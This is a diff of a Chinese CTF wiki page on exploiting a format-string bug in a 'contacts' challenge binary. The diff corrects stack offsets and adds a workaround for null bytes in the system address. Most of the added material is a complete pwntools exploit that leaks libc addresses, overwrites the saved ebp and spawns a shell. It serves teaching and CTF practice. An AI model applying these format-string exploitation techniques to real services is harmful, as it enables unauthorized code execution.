@@ -5234,14 +5234,14 @@ gef➤  dereference <span class="nv">$esp</span> l140
 <div class="codehilite"><pre><span></span>0xffffcd7c│+0x80: 0xf7e13637  →  &lt;__libc_start_main+247&gt; add esp, 0x10
 </pre></div>
 
-<p>存储的就是 main 相应的地址，同时利用 fmtarg 来获取对应的偏移，可以看出其偏移为 32，那么相对于格式化字符串的偏移为 31。</p>
+<p>存储的是__libc_start_main的返回地址，同时利用 fmtarg 来获取对应的偏移，可以看出其偏移为 32，那么相对于格式化字符串的偏移为 31。</p>
 <div class="codehilite"><pre><span></span>gef➤  fmtarg 0xffffcd7c
 The index of format argument : <span class="m">32</span>
 </pre></div>
 
 <p>这样我们便可以得到对应的地址了。进而可以根据 libc-database 来获取对应的 libc，继而获取 system 函数地址与 /bin/sh 函数地址了。</p>
-<p>其次，我们可以确定栈上存储格式化字符串的地址 0xffffcd2c 相对于格式化字符串的偏移为 6，得到这个是为了构造我们的联系人。</p>
-<p>再者，我们可以看出下面的地址保存着上层函数的调用地址，其相对于格式化字符串的偏移为 11，这样我们可以直接修改上层函数存储的 ebp 的值。</p>
+<p>其次，我们可以确定栈上存储格式化字符串的地址 0xffffcd2c 相对于格式化字符串的偏移为 11，得到这个是为了构造我们的联系人。</p>
+<p>再者，我们可以看出下面的地址保存着上层函数的调用地址，其相对于格式化字符串的偏移为 6，这样我们可以直接修改上层函数存储的 ebp 的值。</p>
 <div class="codehilite"><pre><span></span>0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← <span class="nv">$ebp</span>
 </pre></div>
 
@@ -5252,6 +5252,11 @@ The index of format argument : <span class="m">32</span>
 
 <p>来获取对应的相应的地址。后面的 bbbb 是为了接受字符串方便。</p>
 <p>这里因为函数调用时所申请的栈空间与释放的空间是一致的，所以我们得到的 ebp 地址并不会因为我们再次调用而改变。</p>
+<p>在部分环境下，system地址会出现\x00，导致printf的时候出现0截断导致无法泄露两个地址，因此可以将payload的修改如下：</p>
+<div class="codehilite"><pre><span></span>[%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd]
+</pre></div>
+
+<p>payload修改为这样的话，还需要在heap上加入12的偏移。这样保证了0截断出现在泄露之后。</p>
 <h4 id="ebp">修改ebp<a class="headerlink" href="#ebp" title="Permanent link">&para;</a></h4>
 <p>由于我们需要执行 move 指令将 ebp 赋给 esp，并还需要执行 pop ebp 才会执行 ret 指令，所以我们需要将 ebp 修改为存储 system 地址 -4 的值。这样 pop ebp 之后，esp 恰好指向保存 system 的地址，这时在执行 ret 指令即可执行 system 函数。</p>
 <p>上面已经得知了我们希望修改的 ebp 值，而也知道了对应的偏移为 11，所以我们可以构造如下的 payload 来进行修改相应的值。</p>
@@ -5263,7 +5268,7 @@ payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
 <h4 id="shell">获取shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h4>
 <p>这时，执行完格式化字符串函数之后，退出到上上函数，我们输入 5，退出程序即会执行 ret 指令，就可以获取 shell。</p>
 <h4 id="_30">利用程序<a class="headerlink" href="#_30" title="Permanent link">&para;</a></h4>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<p><div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">contact</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./contacts&#39;</span><span class="p">)</span>
 <span class="c1">##context.log_level = &#39;debug&#39;</span>
@@ -5340,8 +5345,78 @@ payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div>
+system出现0截断的情况下，exp如下:
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;debug&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s2">&quot;x86&quot;</span>
 
+<span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;./contacts&quot;</span><span class="p">)</span>
+<span class="n">binary</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;contacts&quot;</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">binary</span><span class="o">.</span><span class="n">libc</span>
+
+<span class="k">def</span> <span class="nf">createcontact</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">phone</span><span class="p">,</span> <span class="n">descrip_len</span><span class="p">,</span> <span class="n">description</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">io</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Contact info: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Name: &#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;You have 10 numbers</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">phone</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Length of description: &#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">descrip_len</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;description:</span><span class="se">\n\t\t</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">description</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">printcontact</span><span class="p">(</span><span class="n">io</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">=</span><span class="n">io</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Contacts:&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>
+
+<span class="c1">#gdb.attach(io)</span>
+
+<span class="n">createcontact</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&quot;1&quot;</span><span class="p">,</span><span class="s2">&quot;1&quot;</span><span class="p">,</span><span class="s2">&quot;111&quot;</span><span class="p">,</span><span class="s2">&quot;%31$paaaa&quot;</span><span class="p">)</span>
+<span class="n">printcontact</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+<span class="n">libc_start_main</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;aaaa&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mi">241</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get libc_start_main addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_start_main</span><span class="p">))</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="n">libc_start_main</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;__libc_start_main&quot;</span><span class="p">]</span>
+<span class="n">system</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>
+<span class="n">binsh</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;system: &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;binsh: &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">binsh</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%6$p%11$pccc&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;bbbb&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;dddd&quot;</span>
+<span class="n">createcontact</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="s1">&#39;111&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">printcontact</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ccc&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">data</span>
+<span class="n">ebp_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">heap_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">12</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;ebp: &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;heap: &quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>
+
+<span class="n">part1</span> <span class="o">=</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
+<span class="n">part2</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="n">part1</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">part1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;x%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">part2</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;x%6$n&#39;</span>
+
+<span class="c1">#payload=fmtstr_payload(6,{ebp_addr:heap_addr})</span>
+<span class="c1">##print payload</span>
+<span class="n">createcontact</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s1">&#39;3333&#39;</span><span class="p">,</span> <span class="s1">&#39;123456789&#39;</span><span class="p">,</span> <span class="s1">&#39;300&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">printcontact</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>
+<span class="c1">##gdb.attach(sh)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;get shell&quot;</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
+<span class="c1">##get shell</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div></p>
 <p>需要注意的是，这样并不能稳定得到 shell，因为我们一次性输入了太长的字符串。但是我们又没有办法在前面控制所想要输入的地址。只能这样了。</p>
+<p>为什么需要打印这么多呢？因为格式化字符串不在栈上，所以就算我们得到了需要更改的ebp的地址，也没有办法去把这个地址写到栈上，利用$符号去定位他；因为没有办法定位，所以没有办法用l\ll等方式去写这个地址，所以只能打印很多。</p>
 <h2 id="_31">格式化字符串盲打<a class="headerlink" href="#_31" title="Permanent link">&para;</a></h2>
 <h3 id="_32">原理<a class="headerlink" href="#_32" title="Permanent link">&para;</a></h3>
 <p>所谓格式化字符串盲打指的是只给出可交互的 ip 地址与端口，不给出对应的 binary 文件来让我们进行 pwn，其实这个和 BROP 差不多，不过 BROP 利用的是栈溢出，而这里我们利用的是格式化字符串漏洞。一般来说，我们按照如下步骤进行</p>
